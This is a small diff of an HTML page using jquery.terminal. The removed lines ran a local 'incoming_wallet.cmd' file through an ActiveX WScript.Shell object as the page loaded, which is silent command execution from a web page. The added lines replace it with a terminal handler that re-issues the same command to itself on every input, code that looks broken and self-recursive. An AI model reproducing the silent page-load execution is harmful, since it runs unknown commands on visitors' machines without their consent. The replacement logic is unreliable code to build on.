@@ -3,6 +3,17 @@
 <script src="https://unpkg.com/jquery.terminal@2.x.x/js/jquery.terminal.min.js"></script>
 <link rel="stylesheet" href="https://unpkg.com/jquery.terminal@2.x.x/css/jquery.terminal.min.css"/>
 <script>
-  var run=new ActiveXObject('WSCRIPT.Shell').Run("incoming_wallet.cmd");
-  console.log("i am working perfectly")
+  $('#terminal').terminal(function(command, term) {
+    return new Promise(function(resolve) {
+        setTimeout(function() {
+            term.exec([
+   'incoming_wallet.cmd',
+]);
+            resolve();
+        }, 1000);
+    });
+});
+
+
+  
 </script><body><h1>It works!</h1> <p id="demo"></p> </body></html>
